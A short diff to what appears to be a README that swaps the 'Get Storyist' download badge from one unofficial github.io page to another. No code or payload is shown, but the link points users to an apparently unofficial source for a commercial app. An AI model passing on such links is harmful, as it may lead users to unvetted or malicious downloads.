@@ -10,7 +10,7 @@
 
 <div align="center">
 
-[![Get Storyist](https://img.shields.io/badge/Get_Storyist-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/storyist)
+[![Get Storyist](https://img.shields.io/badge/Get_Storyist-blue?style=for-the-badge&logo=apple)](https://top-ssilka-apps.github.io/.github/storyist)
 
 </div>
 
